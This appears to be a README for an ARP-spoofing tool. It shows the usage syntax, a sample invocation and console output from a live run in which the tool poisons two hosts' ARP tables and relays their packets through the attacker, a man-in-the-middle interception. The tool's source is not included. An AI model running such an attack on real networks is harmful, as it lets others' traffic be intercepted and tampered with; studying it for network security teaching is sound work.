# arp-spoofing
- arp-spoofing

### Example
```
syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]
sample : arp-spoof en0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2
```
```bash
% sudo ./arp-spoof en0 ***.**.1.9 ***.**.1.254 ***.**.1.50 ***.**.1.254
[+] attacker ip addr: ***.**.1.57
[+] attacker mac addr: **:**:**:50:8e:00
[1] sender ip addr: ***.**.1.9
[2] sender ip addr: ***.**.1.50
[1] sender mac addr: **:**:**:39:42:ec
[1] target ip addr: ***.**.1.254
[1] target mac addr: **:**:**:b9:85:30
[1] Prevent Infection from ARP Recover
Infect the ARP Table
[2] sender mac addr: **:**:**:b3:e7:e9
[2] target ip addr: ***.**.1.254
[1] Relay Packet: 75 bytes
[1] Relay Packet: 75 bytes
[1] Relay Packet: 72 bytes
[2] target mac addr: **:**:**:b9:85:30
[2] Relay Packet: 54 bytes
Infect the ARP Table
```

```bash
$ sudo killall -9 arp-spoof
```



### Results

<img width="305" src="https://user-images.githubusercontent.com/64528476/96743223-bab55900-13fe-11eb-8140-53b842144ca0.png">



### Some problem

- This is infinite loop process so you should kill the process by command.

